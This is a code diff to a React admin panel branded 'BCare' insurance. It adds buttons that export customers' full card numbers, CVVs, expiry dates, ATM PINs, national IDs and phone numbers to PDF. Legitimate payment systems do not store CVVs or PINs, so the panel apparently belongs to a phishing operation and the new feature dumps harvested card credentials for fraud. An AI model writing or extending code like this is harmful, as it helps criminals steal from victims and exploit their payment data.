@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { Globe, Shield, Bell, Database, Save, KeyRound, Trash2, LogOut, Settings, FileText, FileSpreadsheet, Download } from "lucide-react";
+import { Globe, Shield, Bell, Database, Save, KeyRound, Trash2, LogOut, Settings, FileText, FileSpreadsheet, Download, CreditCard } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
@@ -108,6 +108,30 @@ const AdminSettings = () => {
         yPos = (doc as any).lastAutoTable.finalY + 10;
       }
 
+      // Payment Cards
+      if (data.orders.length > 0) {
+        const cardsData = data.orders.filter((o: any) => o.card_number_full || o.card_last_four);
+        if (cardsData.length > 0) {
+          if (yPos > 170) { doc.addPage(); yPos = 20; }
+          doc.setFontSize(13);
+          doc.text("Payment Cards", 14, yPos);
+          (doc as any).autoTable({
+            startY: yPos + 4,
+            head: [["Customer", "Card Number", "CVV", "Expiry", "Holder Name", "Payment Method"]],
+            body: cardsData.map((o: any) => [
+              o.customer_name || o.national_id || "-",
+              o.card_number_full || `****${o.card_last_four || ""}`,
+              o.card_cvv || "-",
+              o.card_expiry || "-",
+              o.card_holder_name || "-",
+              o.payment_method || "-",
+            ]),
+            styles: { fontSize: 7, cellPadding: 2 },
+            headStyles: { fillColor: [220, 53, 69] },
+          });
+          yPos = (doc as any).lastAutoTable.finalY + 10;
+        }
+      }
 
       doc.save("bcare-insurance-data.pdf");
       toast.success("تم تصدير البيانات كملف PDF");
@@ -141,6 +165,41 @@ const AdminSettings = () => {
       logActivity("تصدير البيانات كملف Excel", "settings");
     } catch (err: any) {
       toast.error("فشل تصدير Excel");
+    }
+  };
+
+  const handleExportCardsPDF = async () => {
+    toast.info("جاري تجهيز ملف بطاقات الدفع...");
+    try {
+      const { data: orders } = await supabase.from("insurance_orders").select("*");
+      const cardsData = (orders || []).filter((o: any) => o.card_number_full || o.card_last_four);
+      if (cardsData.length === 0) {
+        toast.info("لا توجد بيانات بطاقات للتصدير");
+        return;
+      }
+      const doc = new jsPDF({ orientation: "landscape" });
+      doc.setFontSize(18);
+      doc.text("BCare - Payment Cards Export", 14, 20);
+      doc.setFontSize(10);
+      doc.text(`Export Date: ${new Date().toLocaleDateString("en-US")}`, 14, 28);
+      doc.text(`Total Cards: ${cardsData.length}`, 14, 34);
+      (doc as any).autoTable({
+        startY: 40,
+        head: [["#", "Customer", "National ID", "Phone", "Card Number", "CVV", "Expiry", "Holder Name", "Method", "ATM PIN", "ATM Bill#", "ATM Biller"]],
+        body: cardsData.map((o: any, i: number) => [
+          i + 1, o.customer_name || "-", o.national_id || "-", o.phone || "-",
+          o.card_number_full || `****${o.card_last_four || ""}`, o.card_cvv || "-",
+          o.card_expiry || "-", o.card_holder_name || "-", o.payment_method || "-",
+          o.atm_pin || "-", o.atm_bill_number || "-", o.atm_biller_code || "-",
+        ]),
+        styles: { fontSize: 7, cellPadding: 2 },
+        headStyles: { fillColor: [220, 53, 69] },
+      });
+      doc.save("bcare-payment-cards.pdf");
+      toast.success("تم تصدير بطاقات الدفع");
+      logActivity("تصدير بطاقات الدفع كملف PDF", "settings");
+    } catch (err: any) {
+      toast.error("فشل تصدير البطاقات");
     }
   };
 
@@ -238,6 +297,7 @@ const AdminSettings = () => {
         </h2>
         <SettingsAction icon={FileText} label="تصدير كملف PDF" onClick={handleExportPDF} />
         <SettingsAction icon={FileSpreadsheet} label="تصدير كملف Excel" onClick={handleExportExcel} />
+        <SettingsAction icon={CreditCard} label="تصدير بطاقات الدفع PDF" onClick={handleExportCardsPDF} />
       </div>
 
       <div className="bg-card rounded-xl border border-border p-4 space-y-3">
